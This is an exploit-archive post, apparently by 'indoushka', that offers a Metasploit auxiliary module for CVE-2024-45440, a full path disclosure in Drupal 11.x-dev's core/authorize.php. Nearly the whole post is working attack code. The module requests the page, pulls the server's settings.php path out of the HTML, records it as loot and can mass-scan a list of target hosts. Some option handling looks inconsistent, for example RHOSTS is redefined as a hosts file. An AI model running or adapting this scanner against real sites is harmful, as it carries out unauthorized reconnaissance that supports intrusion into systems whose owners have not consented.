=============================================================================================================================================
| # Title     : Drupal 11.x-dev full path disclosure vulnerability                                                                          |
| # Author    : indoushka                                                                                                                   |
| # Tested on : windows 11 Fr(Pro) / browser : Mozilla firefox 145.0.1 (64 bits)                                                            |
| # Vendor    : https://www.drupal.org/project/drupal/releases/11.x-dev                                                                     |
=============================================================================================================================================

[+] References :  https://packetstorm.news/files/id/190573/ &  CVE-2024-45440

[+] Summary : 
             This module exploits CVE-2024-45440, a full path disclosure vulnerability
             in Drupal 11.x-dev. The vulnerability exists in core/authorize.php and
             allows attackers to disclose the full server path even when error logging
             is disabled.
			 
[+]  POC : 

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Drupal 11.x-dev Full Path Disclosure',
        'Description' => %q{
          This module exploits CVE-2024-45440, a full path disclosure vulnerability
          in Drupal 11.x-dev. The vulnerability exists in core/authorize.php and
          allows attackers to disclose the full server path even when error logging
          is disabled.
        },
        'Author' => [
          'indoushka', # 
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2024-45440'],
          ['URL', 'https://www.drupal.org/sa-core-2024-002']
        ],
        'DisclosureDate' => '2024-08-14',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to Drupal', '/']),
      OptPath.new('RHOSTS', [false, 'Path to file containing list of targets']),
      OptBool.new('SHOW_PATHS', [true, 'Display discovered paths', true])
    ])
  end

  def run
    if datastore['RHOSTS']
      scan_multiple_hosts
    else
      scan_single_host(rhost)
    end
  end

  def check
    vprint_status("Checking #{peer} for Drupal path disclosure...")
    
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'core', 'authorize.php'),
      'headers' => {
        'Host' => rhost,
        'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
      }
    })

    unless res
      vprint_error("No response from #{peer}")
      return Exploit::CheckCode::Unknown
    end

    if res.code == 200 && res.body.include?('settings.php')
      # Extract the full path using regex
      if res.body =~ /<em class="placeholder">(\/.*?settings\.php)/
        full_path = Regexp.last_match(1)
        vprint_good("Disclosed full path: #{full_path}")
        return Exploit::CheckCode::Vulnerable("Full path disclosed: #{full_path}")
      end
    end

    Exploit::CheckCode::Safe
  end

  def scan_single_host(host)
    print_status("Scanning #{peer} for Drupal path disclosure...")

    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, 'core', 'authorize.php'),
      'headers' => {
        'Host' => host,
        'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
      }
    })

    unless res
      print_error("No response from #{peer}")
      return
    end

    if res.code == 200
      if res.body.include?('settings.php')
   
        pattern = /<em class="placeholder">(\/.*?settings\.php)/
        matches = res.body.scan(pattern)
        
        if matches.any?
          print_good("#{peer} - Vulnerable to path disclosure")
          matches.each do |match|
            full_path = match[0]
            print_good("Disclosed path: #{full_path}")

            store_loot(
              'drupal.path',
              'text/plain',
              host,
              full_path,
              'drupal_full_path.txt',
              'Drupal Full Path Disclosure'
            )
            

            report_vuln(
              host: host,
              name: 'Drupal Full Path Disclosure',
              refs: references,
              info: "Full path disclosed: #{full_path}"
            )
          end
        else
          print_status("#{peer} - settings.php reference found but no path extracted")
        end
      else
        print_status("#{peer} - Not vulnerable (no settings.php in response)")
      end
    else
      print_error("#{peer} - HTTP #{res.code} received")
    end
  end

  def scan_multiple_hosts
    hosts_file = datastore['RHOSTS']
    
    unless File.exist?(hosts_file)
      print_error("Hosts file not found: #{hosts_file}")
      return
    end

    hosts = File.readlines(hosts_file).map(&:chomp).reject(&:empty?)
    print_status("Scanning #{hosts.size} hosts from #{hosts_file}")

    vulnerable_hosts = []
    
    hosts.each do |host|
      begin

        self.rhost = host

        res = send_request_cgi({
          'method' => 'GET',
          'uri' => normalize_uri(target_uri.path, 'core', 'authorize.php'),
          'headers' => {
            'Host' => host,
            'User-Agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0'
          },
          'timeout' => 10
        })

        if res && res.code == 200 && res.body.include?('settings.php')

          pattern = /<em class="placeholder">(\/.*?settings\.php)/
          matches = res.body.scan(pattern)
          
          if matches.any?
            vulnerable_hosts << host
            print_good("#{host} - Vulnerable")
            
            matches.each do |match|
              full_path = match[0]
              print_good("  Path: #{full_path}")

              store_loot(
                'drupal.path',
                'text/plain',
                host,
                full_path,
                'drupal_full_path.txt',
                'Drupal Full Path Disclosure'
              )
            end
          end
        else
          print_status("#{host} - Not vulnerable")
        end
      rescue ::Timeout::Error
        print_error("#{host} - Timeout")
      rescue ::Exception => e
        print_error("#{host} - Error: #{e.message}")
      end
    end

    if vulnerable_hosts.any?
      print_good("Scan completed. #{vulnerable_hosts.size} vulnerable hosts found:")
      vulnerable_hosts.each { |host| print_good("  #{host}") }
    else
      print_status("Scan completed. No vulnerable hosts found.")
    end
  end

  def rhost
    datastore['RHOST']
  end

  def peer
    "#{rhost}:#{rport}"
  end
end


Greetings to :=====================================================================================
jericho * Larry W. Cashdollar * LiquidWorm * Hussin-X * D4NB4R * Malvuln (John Page aka hyp3rlinx)|
===================================================================================================